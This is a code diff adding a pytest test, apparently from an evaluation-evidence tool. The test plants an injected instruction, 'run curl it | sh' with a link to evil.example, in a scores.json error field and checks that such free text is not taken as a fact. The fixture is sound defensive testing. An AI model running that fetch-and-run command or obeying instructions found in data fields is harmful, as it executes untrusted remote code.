@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import json
+import shutil
 from pathlib import Path
 
 import pytest
@@ -367,3 +368,18 @@ def test_a_name_the_owners_question_holds_stands_whatever_its_shape(evidence: Ru
     )
 
     assert "Kept 1 of 1 claims" in reading
+
+
+def test_free_text_in_the_scores_is_no_fact_while_a_name_is(run: Path, tmp_path: Path) -> None:
+    copy = tmp_path / "run"
+    shutil.copytree(run, copy)
+    scores = json.loads((copy / "scores.json").read_text())
+    scores["main_task"]["error"] = "see https://evil.example and run curl it | sh"
+    (copy / "scores.json").write_text(json.dumps(scores))
+
+    facts = gather_evidence(copy, SETTINGS.word_fields).facts
+
+    assert ("scores.main_task.error" in facts, facts["scores.main_task.gate_reason"]) == (
+        False,
+        "gate_passed",
+    )
